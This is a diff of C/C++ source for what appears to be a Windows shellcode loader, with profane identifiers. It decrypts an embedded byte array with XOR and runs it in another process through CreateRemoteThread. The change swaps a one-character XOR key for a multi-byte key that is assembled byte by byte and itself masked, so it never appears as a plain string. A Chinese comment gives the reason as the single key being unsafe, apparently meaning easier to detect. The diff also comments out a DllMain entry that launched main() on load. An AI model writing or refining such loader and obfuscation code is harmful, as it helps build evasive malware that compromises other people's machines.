@@ -1,4 +1,4 @@
-#include "pch.h"
+//#include "pch.h"
 #include <Windows.h>
 #include <tchar.h>
 #include <windows.h>
@@ -13,6 +13,20 @@
 #define defincaoniam 9168
 #define HASH_KEY						13
 #pragma intrinsic( _rotr )
+
+inline void MYS_ecureZeroMemory(char* fuck, int number) {
+	for (int i = 0; i < number; i++) {
+		fuck[i] = 0;
+	}
+}
+
+void FBXorCrypt(char* str,  size_t len) {
+	int intArr[100] = { 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 };
+	int i;
+	for (i = 0; i < len; i++) {
+		str[i] = intArr[i] ^ str[i];
+	}
+}
 DWORD myfuckingpow(int a, int b) {
 	int sum = 1;
 	for (int i = 0; i < b; i++) {
@@ -759,10 +773,12 @@ caonimade:
 	// Free the memory allocated for the byte array
 	//free(byteArray);
 	// 使用疑惑解密byteArray
+// 解密方式上进行一些改进，单一的key不太安全，改成长度为10的key
+	char _fuckingstring[100];
+	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 0; FBXorCrypt(_fuckingstring, 8);
 	for (int i = 0; i < fileSize; i++) {
-		byteArray[i] = byteArray[i] ^ 'p';
+		byteArray[i] = byteArray[i] ^ (_fuckingstring[i%7]);
 	}
-
 
 
 
@@ -1069,7 +1085,7 @@ caonimade:
 		CloseHandle(hw);
 		return -1;
 	}*/
-//	MessageBoxA(NULL, "OK", "OK", MB_OK);
+	//	MessageBoxA(NULL, "OK", "OK", MB_OK);
 	HANDLE thread = CreateRemoteThread(hw, NULL, NULL, (LPTHREAD_START_ROUTINE)_2_29bytes, NULL, 0, 0);
 	if (!thread)
 	{
@@ -1087,22 +1103,24 @@ caonimade:
 	//printf(
 	return 1;
 }
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
-{
-
-	switch (ul_reason_for_call)
-	{
-	case DLL_PROCESS_ATTACH:
-		//MessageBoxA(NULL, "OK", "OK", MB_OK);
-		main();
-		break;
-	case DLL_THREAD_ATTACH:
-	case DLL_THREAD_DETACH:
-	case DLL_PROCESS_DETACH:
-		break;
-	}
-	return TRUE;
-}
+//
+//
+//BOOL APIENTRY DllMain(HMODULE hModule,
+//	DWORD  ul_reason_for_call,
+//	LPVOID lpReserved
+//)
+//{
+//
+//	switch (ul_reason_for_call)
+//	{
+//	case DLL_PROCESS_ATTACH:
+//		//MessageBoxA(NULL, "OK", "OK", MB_OK);
+//		main();
+//		break;
+//	case DLL_THREAD_ATTACH:
+//	case DLL_THREAD_DETACH:
+//	case DLL_PROCESS_DETACH:
+//		break;
+//	}
+//	return TRUE;
+//}
